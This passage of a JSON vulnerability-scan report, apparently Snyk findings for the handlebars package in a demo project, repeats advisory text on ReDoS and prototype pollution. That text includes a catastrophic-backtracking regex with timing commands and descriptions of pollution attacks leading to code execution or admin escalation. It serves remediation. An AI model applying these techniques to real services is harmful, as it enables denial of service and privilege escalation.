C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `handlebars` to version 4.6.0 or higher.\n## References\n- [GitHub PR](https://github.com/handlebars-lang/handlebars.js/pull/1633)\n- [HackerOne Report](https://hackerone.com/reports/726364)\n",
          "impact": 0.5,
          "code": "{\n  \"CVSSv3\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N/E:P/RL:O/RC:C\",\n  \"alternativeIds\": [],\n  \"creationTime\": \"2020-04-28T14:26:34.538485Z\",\n  \"credit\": [\n    \"macasun\"\n  ],\n  \"cvssScore\": 6.5,\n  \"description\": \"## Overview\\n[handlebars](https://www.npmjs.com/package/handlebars) is an extension to the Mustache templating language.\\n\\nAffected versions of this package are vulnerable to Prototype Pollution. Prototype access to the template engine allows for potential code execution.\\n\\n## Details\\n\\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\\n\\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\\n\\nLet’s take the following regular expression as an example:\\n```js\\nregex = /A(B|C+)+D/\\n```\\n\\nThis regular expression accomplishes the following:\\n- `A` The string must start with the letter 'A'\\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\\n- `D` Finally, we ensure this section of the string ends with a 'D'\\n\\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\\n\\nIt most cases, it doesn't take very long for a regex engine to find a match:\\n\\n```bash\\n$ time node -e '/A(B|C+)+D/.test(\\\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\\\")'\\n0.04s user 0.01s system 95% cpu 0.052 total\\n\\n$ time node -e '/A(B|C+)+D/.test(\\\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\\\")'\\n1.79s user 0.02s system 99% cpu 1.812 total\\n```\\n\\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\\n\\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\\n\\nLet's look at how our expression runs into this problem, using a shorter string: \\\"ACCCX\\\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\\n1. CCC\\n2. CC+C\\n3. C+CC\\n4. C+C+C.\\n\\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\\n\\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\\n\\n| String | Number of C's | Number of steps |\\n| -------|-------------:| -----:|\\n| ACCCX | 3 | 38\\n| ACCCCX | 4 | 71\\n| ACCCCCX | 5 | 136\\n| ACCCCCCCCCCCCCCX | 14 | 65,553\\n\\n\\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\\n\\n## Remediation\\nUpgrade `handlebars` to version 4.6.0 or higher.\\n## References\\n- [GitHub PR](https://github.com/handlebars-lang/handlebars.js/pull/1633)\\n- [HackerOne Report](https://hackerone.com/reports/726364)\\n\",\n  \"disclosureTime\": \"2020-04-27T22:13:11Z\",\n  \"exploit\": \"Proof of Concept\",\n  \"fixedIn\": [\n    \"4.6.0\"\n  ],\n  \"functions\": [],\n  \"functions_new\": [],\n  \"id\": \"SNYK-JS-HANDLEBARS-567742\",\n  \"identifiers\": {\n    \"CVE\": [],\n    \"CWE\": [\n      \"CWE-400\"\n    ]\n  },\n  \"language\": \"js\",\n  \"malicious\": false,\n  \"modificationTime\": \"2021-02-07T10:35:00.642664Z\",\n  \"moduleName\": \"handlebars\",\n  \"packageManager\": \"npm\",\n  \"packageName\": \"handlebars\",\n  \"patches\": [],\n  \"proprietary\": false,\n  \"publicationTime\": \"2020-04-28T14:28:34Z\",\n  \"references\": [\n    {\n      \"title\": \"GitHub PR\",\n      \"url\": \"https://github.com/handlebars-lang/handlebars.js/pull/1633\"\n    },\n    {\n      \"title\": \"HackerOne Report\",\n      \"url\": \"https://hackerone.com/reports/726364\"\n    }\n  ],\n  \"semver\": {\n    \"vulnerable\": [\n      \"<4.6.0\"\n    ]\n  },\n  \"severity\": \"medium\",\n  \"socialTrendAlert\": false,\n  \"title\": \"Prototype Pollution\",\n  \"severityWithCritical\": \"medium\",\n  \"from\": [\n    \"goof@1.0.1\",\n    \"hbs@4.0.4\",\n    \"handlebars@4.0.14\"\n  ],\n  \"upgradePath\": [\n    false,\n    \"hbs@4.1.1\",\n    \"handlebars@4.7.6\"\n  ],\n  \"isUpgradable\": true,\n  \"isPatchable\": false,\n  \"name\": \"handlebars\",\n  \"version\": \"4.0.14\"\n}",
          "results": [
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , hbs@4.0.4 , handlebars@4.0.14 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , istanbul-reports@1.4.0 , handlebars@4.0.11 ]",
              "run_time": 0,
              "start_time": ""
            }
          ]
        },
        {
          "tags": {
            "cci": [
              "CCI-000213"
            ],
            "nist": [
              "AC-3"
            ],
            "cweid": [
              "471"
            ],
            "cveid": [],
            "ghsaid": [
              "6r5x-hmgg-7h53"
            ]
          },
          "descriptions": [],
          "refs": [],
          "source_location": {},
          "title": "Prototype Pollution",
          "id": "SNYK-JS-HANDLEBARS-173692",
          "desc": "## Overview\n[handlebars](https://www.npmjs.com/package/handlebars) is an extension to the Mustache templating language.\n\nAffected versions of this package are vulnerable to Prototype Pollution. Templates may alter an Objects' prototype, thus allowing an attacker to execute arbitrary code on the server.\n\n## Details\n\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `_proto_`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\n\nThere are two main ways in which the pollution of prototypes occurs:\n\n-   Unsafe `Object` recursive merge\n    \n-   Property definition by path\n    \n\n### Unsafe Object recursive merge\n\nThe logic of a vulnerable recursive merge function follows the following high-level model:\n```\nmerge (target, source)\n\n  foreach property of source\n\n    if property exists and is an object on both the target and the source\n\n      merge(target[property], source[property])\n\n    else\n\n      target[property] = source[property]\n```\n<br>  \n\nWhen the source object contains a property named `_proto_` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\n\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\n\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\n\n### Property definition by path\n\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\n\nIf the attacker can control the value of “path”, they can set this value to `_proto_.myValue`. `myValue` is then assigned to the prototype of the class of the object.\n\n## Types of attacks\n\nThere are a few methods by which Prototype Pollution can be manipulated:\n\n| Type |Origin  |Short description |\n|--|--|--|\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\n\n## Affected environments\n\nThe following environments are susceptible to a Prototype Pollution attack:\n\n-   Application server\n    \n-   Web server\n    \n\n## How to prevent\n\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\n    \n2.  Require schema validation of JSON input.\n    \n3.  Avoid using unsafe recursive merge functions.\n    \n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\n    \n5.  As a best practice use `Map` instead of `Object`.\n\n### For more information on this vulnerability type:\n\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\n\n## Remediation\nUpgrade `handlebars` to version 4.0.14, 4.1.2 or higher.\n## References\n- [GitHub Commit](https://github.com/wycats/handlebars.js/commit/7372d4e9dffc9d70c09671aa28b9392a1577fd86)\n- [GitHub Issue](https://github.com/wycats/handlebars.js/issues/1495)\n- [NPM Security Advisory](https://www.npmjs.com/advisories/755)\n",
          "impact": 0.7,
          "code": "{\n  \"CVSSv3\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L\",\n  \"alternativeIds\": [],\n  \"creationTime\": \"2019-02-14T16:46:18.024227Z\",\n  \"credit\": [\n    \"Mahmoud Gamal\",\n    \"Matias Lang\"\n  ],\n  \"cvssScore\": 7.3,\n  \"description\": \"## Overview\\n[handlebars](https://www.npmjs.com/package/handlebars) is an extension to the Mustache templating language.\\n\\nAffected versions of this package are vulnerable to Prototype Pollution. Templates may alter an Objects' prototype, thus allowing an attacker to execute arbitrary code on the server.\\n\\n## Details\\n\\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `_proto_`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\\n\\nThere are two main ways in which the pollution of prototypes occurs:\\n\\n-   Unsafe `Object` recursive merge\\n    \\n-   Property definition by path\\n    \\n\\n### Unsafe Object recursive merge\\n\\nThe logic of a vulnerable recursive merge function follows the following high-level model:\\n```\\nmerge (target, source)\\n\\n  foreach property of source\\n\\n    if property exists and is an object on both the target and the source\\n\\n      merge(target[property], source[property])\\n\\n    else\\n\\n      target[property] = source[property]\\n```\\n<br>  \\n\\nWhen the source object contains a property named `_proto_` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\\n\\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\\n\\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\\n\\n### Property definition by path\\n\\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\\n\\nIf the attacker can control the value of “path”, they can set this value to `_proto_.myValue`. `myValue` is then assigned to the prototype of the class of the object.\\n\\n## Types of attacks\\n\\nThere are a few methods by which Prototype Pollution can be manipulated:\\n\\n| Type |Origin  |Short description |\\n|--|--|--|\\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\\n\\n## Affected environments\\n\\nThe following environments are susceptible to a Prototype Pollution attack:\\n\\n-   Application server\\n    \\n-   Web server\\n    \\n\\n## How to prevent\\n\\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\\n    \\n2.  Require schema validation of JSON input.\\n    \\n3.  Avoid using unsafe recursive merge functions.\\n    \\n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\\n    \\n5.  As a best practice use `Map` instead of `Object`.\\n\\n### For more information on this vulnerability type:\\n\\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\\n\\n## Remediation\\nUpgrade `handlebars` to version 4.0.14, 4.1.2 or higher.\\n## References\\n- [GitHub Commit](https://github.com/wycats/handlebars.js/commit/7372d4e9dffc9d70c09671aa28b9392a1577fd86)\\n- [GitHub Issue](https://github.com/wycats/handlebars.js/issues/1495)\\n- [NPM Security Advisory](https://www.npmjs.com/advisories/755)\\n\",\n  \"disclosureTime\": \"2018-12-28T20:34:57Z\",\n  \"exploit\": \"Not Defined\",\n  \"fixedIn\": [\n    \"4.0.14\",\n    \"4.1.2\"\n  ],\n  \"functions\": [\n    {\n      \"functionId\": {\n        \"className\": null,\n        \"filePath\": \"dist/amd/handlebars/compiler/javascript-compiler.js\",\n        \"functionName\": \"JavaScriptCompiler.prototype.nameLookup\"\n      },\n      \"version\": [\n        \">1.0.12 <4.0.13\"\n      ]\n    },\n    {\n      \"functionId\": {\n        \"className\": null,\n        \"filePath\": \"dist/handlebars.js\",\n        \"functionName\": \"JavaScriptCompiler.Handlebars.JavaScriptCompiler\"\n      },\n      \"version\": [\n        \">=1.0.6 <=1.0.12\"\n      ]\n    }\n  ],\n  \"functions_new\": [\n    {\n      \"functionId\": {\n        \"filePath\": \"dist/amd/handlebars/compiler/javascript-compiler.js\",\n        \"functionName\": \"JavaScriptCompiler.prototype.nameLookup\"\n      },\n      \"version\": [\n        \">1.0.12 <4.0.13\"\n      ]\n    },\n    {\n      \"functionId\": {\n        \"filePath\": \"dist/handlebars.js\",\n        \"functionName\": \"JavaScriptCompiler.Handlebars.JavaScriptCompiler\"\n      },\n      \"version\": [\n        \">=1.0.6 <=1.0.12\"\n      ]\n    }\n  ],\n  \"id\": \"SNYK-JS-HANDLEBARS-173692\",\n  \"identifiers\": {\n    \"CVE\": [],\n    \"CWE\": [\n      \"CWE-471\"\n    ],\n    \"GHSA\": [\n      \"GHSA-6r5x-hmgg-7h53\"\n    ],\n    \"NSP\": [\n      \"755\"\n    ]\n  },\n  \"language\": \"js\",\n  \"malicious\": false,\n  \"modificationTime\": \"2020-12-14T14:40:53.284737Z\",\n  \"moduleName\": \"handlebars\",\n  \"packageManager\": \"npm\",\n  \"packageName\": \"handlebars\",\n  \"patches\": [],\n  \"proprietary\": false,\n  \"publicationTime\": \"2019-02-14T17:52:50Z\",\n  \"references\": [\n    {\n      \"title\": \"GitHub Commit\",\n      \"url\": \"https://github.com/wycats/handlebars.js/commit/7372d4e9dffc9d70c09671aa28b9392a1577fd86\"\n    },\n    {\n      \"title\": \"GitHub Issue\",\n      \"url\": \"https://github.com/wycats/handlebars.js/issues/1495\"\n    },\n    {\n      \"title\": \"NPM Security Advisory\",\n      \"url\": \"https://www.npmjs.com/advisories/755\"\n    }\n  ],\n  \"semver\": {\n    \"vulnerable\": [\n      \"<4.0.14\",\n      \">=4.1.0 <4.1.2\"\n    ]\n  },\n  \"severity\": \"high\",\n  \"socialTrendAlert\": false,\n  \"title\": \"Prototype Pollution\",\n  \"severityWithCritical\": \"high\",\n  \"from\": [\n    \"goof@1.0.1\",\n    \"tap@11.1.5\",\n    \"nyc@11.9.0\",\n    \"istanbul-reports@1.4.0\",\n    \"handlebars@4.0.11\"\n  ],\n  \"upgradePath\": [\n    false,\n    \"tap@11.1.5\",\n    \"nyc@11.9.0\",\n    \"istanbul-reports@1.4.0\",\n    \"handlebars@4.0.14\"\n  ],\n  \"isUpgradable\": true,\n  \"isPatchable\": false,\n  \"name\": \"handlebars\",\n  \"version\": \"4.0.11\"\n}",
          "results": [
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , istanbul-reports@1.4.0 , handlebars@4.0.11 ]",
              "run_time": 0,
              "start_time": ""
            }
          ]
        },
        {
          "tags": {
            "cci": [
              "CCI-000213"
            ],
            "nist": [
              "AC-3"
            ],
            "cweid": [
              "471"
            ],
            "cveid": [],
            "ghsaid": [
              "q42p-pg8m-cqh6"
            ]
          },
          "descriptions": [],
          "refs": [],
          "source_location": {},
          "title": "Prototype Pollution",
          "id": "SNYK-JS-HANDLEBARS-174183",
          "desc": "## Overview\n[handlebars](https://www.npmjs.com/package/handlebars) is an extension to the Mustache templating language.\n\nAffected versions of this package are vulnerable to Prototype Pollution. A Prototype Pollution allowing Remote Code Execution can be exploited using the constructor, via the 'lookup' helper.\r\nThis vulnerability is due to an incomplete fix for: `SNYK-JS-HANDLEBARS-173692`\n\n## Details\n\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `_proto_`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\n\nThere are two main ways in which the pollution of prototypes occurs:\n\n-   Unsafe `Object` recursive merge\n    \n-   Property definition by path\n    \n\n### Unsafe Object recursive merge\n\nThe logic of a vulnerable recursive merge function follows the following high-level model:\n```\nmerge (target, source)\n\n  foreach property of source\n\n    if property exists and is an object on both the target and the source\n\n      merge(target[property], source[property])\n\n    else\n\n      target[property] = source[property]\n```\n<br>  \n\nWhen the source object contains a property named `_proto_` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\n\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\n\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\n\n### Property definition by path\n\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\n\nIf the attacker can control the value of “path”, they can set this value to `_proto_.myValue`. `myValue` is then assigned to the prototype of the class of the object.\n\n## Types of attacks\n\nThere are a few methods by which Prototype Pollution can be manipulated:\n\n| Type |Origin  |Short description |\n|--|--|--|\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\n\n## Affected environments\n\nThe following environments are susceptible to a Prototype Pollution attack:\n\n-   Application server\n    \n-   Web server\n    \n\n## How to prevent\n\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\n    \n2.  Require schema validation of JSON input.\n    \n3.  Avoid using unsafe recursive merge functions.\n    \n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\n    \n5.  As a best practice use `Map` instead of `Object`.\n\n### For more information on this vulnerability type:\n\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\n\n## Remediation\nUpgrade `handlebars` to version 3.0.7, 4.1.2, 4.0.14 or higher.\n## References\n- [GitHub Commit](https://github.com/wycats/handlebars.js/commit/cd38583216dce3252831916323202749431c773e)\n- [GitHub Issue](https://github.com/wycats/handlebars.js/issues/1495)\n- [SNYK-JS-HANDLEBARS-173692](https://snyk.io/vuln/SNYK-JS-HANDLEBARS-173692)\n",
          "impact": 0.7,
          "code": "{\n  \"CVSSv3\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L\",\n  \"alternativeIds\": [],\n  \"creationTime\": \"2019-04-14T11:55:45.212136Z\",\n  \"credit\": [\n    \"Nils Knappmeier\"\n  ],\n  \"cvssScore\": 7.3,\n  \"description\": \"## Overview\\n[handlebars](https://www.npmjs.com/package/handlebars) is an extension to the Mustache templating language.\\n\\nAffected versions of this package are vulnerable to Prototype Pollution. A Prototype Pollution allowing Remote Code Execution can be exploited using the constructor, via the 'lookup' helper.\\r\\nThis vulnerability is due to an incomplete fix for: `SNYK-JS-HANDLEBARS-173692`\\n\\n## Details\\n\\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `_proto_`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\\n\\nThere are two main ways in which the pollution of prototypes occurs:\\n\\n-   Unsafe `Object` recursive merge\\n    \\n-   Property definition by path\\n    \\n\\n### Unsafe Object recursive merge\\n\\nThe logic of a vulnerable recursive merge function follows the following high-level model:\\n```\\nmerge (target, source)\\n\\n  foreach property of source\\n\\n    if property exists and is an object on both the target and the source\\n\\n      merge(target[property], source[property])\\n\\n    else\\n\\n      target[property] = source[property]\\n```\\n<br>  \\n\\nWhen the source object contains a property named `_proto_` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\\n\\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\\n\\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\\n\\n### Property definition by path\\n\\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\\n\\nIf the attacker can control the value of “path”, they can set this value to `_proto_.myValue`. `myValue` is then assigned to the prototype of the class of the object.\\n\\n## Types of attacks\\n\\nThere are a few methods by which Prototype Pollution can be manipulated:\\n\\n| Type |Origin  |Short description |\\n|--|--|--|\\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\\n\\n## Affected environments\\n\\nThe following environments are susceptible to a Prototype Pollution attack:\\n\\n-   Application server\\n    \\n-   Web server\\n    \\n\\n## How to prevent\\n\\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\\n    \\n2.  Require schema validation of JSON input.\\n    \\n3.  Avoid using unsafe recursive merge functions.\\n    \\n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\\n    \\n5.  As a best practice use `Map` instead of `Object`.\\n\\n### For more information on this vulnerability type:\\n\\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\\n\\n## Remediation\\nUpgrade `handlebars` to version 3.0.7, 4.1.2, 4.0.14 or higher.\\n## References\\n- [GitHub Commit](https://github.com/wycats/handlebars.js/commit/cd38583216dce3252831916323202749431c773e)\\n- [GitHub Issue](https://github.com/wycats/handlebars.js/issues/1495)\\n- [SNYK-JS-HANDLEBARS-173692](https://snyk.io/vuln/SNYK-JS-HANDLEBARS-173692)\\n\",\n  \"disclosureTime\": \"2019-04-13T06:31:34Z\",\n  \"exploit\": \"Not Defined\",\n  \"fixedIn\": [\n    \"3.0.7\",\n    \"4.1.2\",\n    \"4.0.14\"\n  ],\n  \"functions\": [\n    {\n      \"functionId\": {\n        \"className\": null,\n        \"filePath\": \"lib/handlebars/helpers/lookup.js\",\n        \"functionName\": \"module.exports\"\n      },\n      \"version\": [\n        \">3.0.6 <4.1.2\"\n      ]\n    }\n  ],\n  \"functions_new\": [\n    {\n      \"functionId\": {\n        \"filePath\": \"lib/handlebars/helpers/lookup.js\",\n        \"functionName\": \"module.exports\"\n      },\n      \"version\": [\n        \">3.0.6 <4.1.2\"\n      ]\n    }\n  ],\n  \"id\": \"SNYK-JS-HANDLEBARS-174183\",\n  \"identifiers\": {\n    \"CVE\": [],\n    \"CWE\": [\n      \"CWE-471\"\n    ],\n    \"GHSA\": [\n      \"GHSA-q42p-pg8m-cqh6\"\n    ]\n  },\n  \"language\": \"js\",\n  \"malicious\": false,\n  \"modificationTime\": \"2021-02-07T10:35:57.706044Z\",\n  \"moduleName\": \"handlebars\",\n  \"packageManager\": \"npm\",\n  \"packageName\": \"handlebars\",\n  \"patches\": [],\n  \"proprietary\": false,\n  \"publicationTime\": \"2019-04-14T06:31:34Z\",\n  \"references\": [\n    {\n      \"title\": \"GitHub Commit\",\n      \"url\": \"https://github.com/wycats/handlebars.js/commit/cd38583216dce3252831916323202749431c773e\"\n    },\n    {\n      \"title\": \"GitHub Issue\",\n      \"url\": \"https://github.com/wycats/handlebars.js/issues/1495\"\n    },\n    {\n      \"title\": \"SNYK-JS-HANDLEBARS-173692\",\n      \"url\": \"https://snyk.io/vuln/SNYK-JS-HANDLEBARS-173692\"\n    }\n  ],\n  \"semver\": {\n    \"vulnerable\": [\n      \">=3.0.0 <3.0.7\",\n      \">=4.1.0 <4.1.2\",\n      \">=4.0.0 <4.0.14\"\n    ]\n  },\n  \"severity\": \"high\",\n  